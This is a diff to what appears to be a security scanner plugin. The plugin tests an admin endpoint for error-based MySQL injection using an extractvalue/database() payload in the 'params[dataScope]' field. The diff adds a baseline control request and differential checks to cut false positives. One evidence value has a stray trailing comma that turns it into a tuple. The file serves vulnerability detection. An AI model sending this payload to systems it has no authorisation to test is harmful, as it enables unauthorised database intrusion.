@@ -4,6 +4,7 @@
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import host_of, join_url
 from lib.colors import no, ok
+from lib.reporter import emit
 from plugins.base import PluginBase
 
 
@@ -83,24 +84,73 @@ class SqlInjectDeptPlugin(PluginBase):
         # MySQL 报错时把 database() 子查询结果回显进错误信息，无回显场景也可靠关键词判读
         data = {"params[dataScope]": "and extractvalue(1, concat(0x7e,(select database()),0x7e))"}
         url = join_url(target, "/system/dept/list")
+        # 基线对照请求：同一请求、仅去掉注入 payload，用于区分「目标常驻文案」与「注入报错」
+        control_data = {"params[dataScope]": ""}
         try:
+            control_text = session.post(url, headers=headers, data=control_data).text
             resp = session.post(url, headers=headers, data=data)
-            sql_inject = resp.text
+            inject_text = resp.text
         except Exception as e:
-            print(no("第二种POST型报错注入（网络异常）"))
-            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
-        # 判定 1:1 保留：'运行时异常' in t or 'database()' in t
-        if "运行时异常" in sql_inject or "database()" in sql_inject:
-            print(ok("存在第二种POST型报错注入"))
+            emit(no("第二种POST型报错注入（网络异常）"))
+            return ScanResult(kind="info", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
+
+        # 判定（加固版·差分法）：与 sql_inject_role 同一套规则，详见该插件注释。
+        STRONG_SIG = "XPATH syntax error"
+        WEAK_SIG = "运行时异常"
+        REFLECTION = "extractvalue(1,"
+
+        inj_strong = STRONG_SIG in inject_text
+        inj_weak = WEAK_SIG in inject_text
+        ctl_strong = STRONG_SIG in control_text
+        ctl_weak = WEAK_SIG in control_text
+
+        # 1) 强特征差分命中 → 注入确实被求值
+        if inj_strong and not ctl_strong:
+            emit(ok("存在第二种POST型报错注入"))
             return ScanResult(
                 kind="vuln",
                 name=self.name,
                 severity=self.severity,
                 status=STATUS_CONFIRMED,
                 url=url,
-                evidence="响应含 运行时异常 或 database() 报错特征",
+                evidence=f"响应含 MySQL extractvalue 求值报错特征（{STRONG_SIG}），且基线请求无此特征",
                 fix=self.fix,
             )
-        else:
-            print(no("不存在其他POST型报错注入"))
-            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
+        # 2) 强特征基线同样含 → 常驻文案，无法归因
+        if inj_strong and ctl_strong:
+            emit(no("第二种POST型报错注入：基线已含求值报错文案，无法归因"))
+            return ScanResult(
+                kind="info",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=url,
+                evidence=f"基线请求与注入请求均含 {STRONG_SIG}，该文案疑似目标常驻内容，需人工复核",
+            )
+        # 3) 弱特征差分命中且无载荷回显 → 注入导致的异常
+        if inj_weak and not ctl_weak and REFLECTION not in inject_text:
+            emit(ok("存在第二种POST型报错注入"))
+            return ScanResult(
+                kind="vuln",
+                name=self.name,
+                severity=self.severity,
+                status=STATUS_CONFIRMED,
+                url=url,
+                evidence=f"注入请求含 {WEAK_SIG} 而基线请求不含，且无载荷回显",
+                fix=self.fix,
+            )
+        # 4) 弱特征命中但基线同样命中，或响应回显载荷 → 无法区分，保守判 UNKNOWN
+        if inj_weak and (ctl_weak or REFLECTION in inject_text):
+            emit(no("第二种POST型报错注入：异常文案无法归因，判 UNKNOWN"))
+            return ScanResult(
+                kind="info",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=url,
+                evidence=(
+                    f"注入请求含 {WEAK_SIG}，但"
+                    + ("基线请求同样含该文案" if ctl_weak else "响应存在载荷回显")
+                    + "，无法区分注入成功与目标常驻错误页，需人工复核",
+                ),
+            )
+        emit(no("不存在其他POST型报错注入"))
+        return ScanResult(kind="info", name=self.name, status=STATUS_SAFE, url=url)
